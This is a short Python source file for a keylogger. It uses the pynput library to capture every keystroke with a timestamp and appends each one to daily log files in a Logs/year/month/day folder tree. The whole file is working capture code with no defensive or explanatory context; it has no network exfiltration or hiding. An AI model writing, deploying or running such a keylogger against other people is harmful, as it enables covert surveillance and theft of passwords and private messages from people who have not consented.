from pynput.keyboard import Listener
import os
from datetime import datetime as dt


def setup():
    now = dt.now()
    if not os.path.exists('Logs'):
        os.mkdir('Logs')
    month = str(now.month)
    day = str(now.day)
    year = str(now.year)
    if len(month) == 1:
        month = f'0{month}'
    if len(day) == 1:
        day = f'0{day}'
    if not os.path.exists(f'Logs/{year}'):
        os.mkdir(f'Logs/{year}')
    if not os.path.exists(f'Logs/{year}/{month}'):
        os.mkdir(f'Logs/{year}/{month}')
    if not os.path.exists(f'Logs/{year}/{month}/{day}.txt'):
        with open(f'Logs/{year}/{month}/{day}.txt', 'w') as f:
            f.close()
     
      
    
def get_time():
    now = dt.now()
    return f'{now.hour}:{now.minute}:{now.second}'
def on_press(key):
    key = str(key)
    now = dt.now()
    month = str(now.month)
    if len(month) == 1:
        month = f'0{month}'
    day = str(now.day)
    if len(day) == 1:
        day = f'0{day}'
    
    with open(f'Logs/{now.year}/{month}/{day}.txt', 'a') as f:
        f.write(F'{get_time()} {key}\n')
        f.close()
 

def run():
    setup()
    with Listener(on_press=on_press) as listener:
        listener.join()

